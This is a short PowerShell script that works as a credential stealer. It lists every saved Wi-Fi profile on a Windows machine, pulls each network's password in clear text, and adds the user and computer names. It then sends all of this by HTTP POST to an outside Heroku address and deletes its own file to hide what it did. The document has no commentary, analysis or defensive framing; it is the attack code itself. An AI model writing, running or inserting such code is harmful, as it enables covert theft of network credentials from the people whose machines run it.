$targetUrl = "https://cnl-cred-4bb1b041c738.herokuapp.com"
$profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ':')[1].Trim() }
$data = @{username=$env:UserName;computer=$env:COMPUTERNAME;wifi=@()}
if ($profiles) {
    foreach ($profile in $profiles) {
        $pwData = netsh wlan show profile name="$profile" key=clear | Select-String "Key Content"
        $pw = if ($pwData) { ($pwData -split ':')[1].Trim() } else { "" }

        $data.wifi += @{
            ssid = $profile
            key = $pw
        }
    }
    $json = $data | ConvertTo-Json -Depth 2
    Invoke-WebRequest -Uri $targetUrl -Method POST -Body $json
}
$scriptPath = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 1
Remove-Item -Path $scriptPath -Force
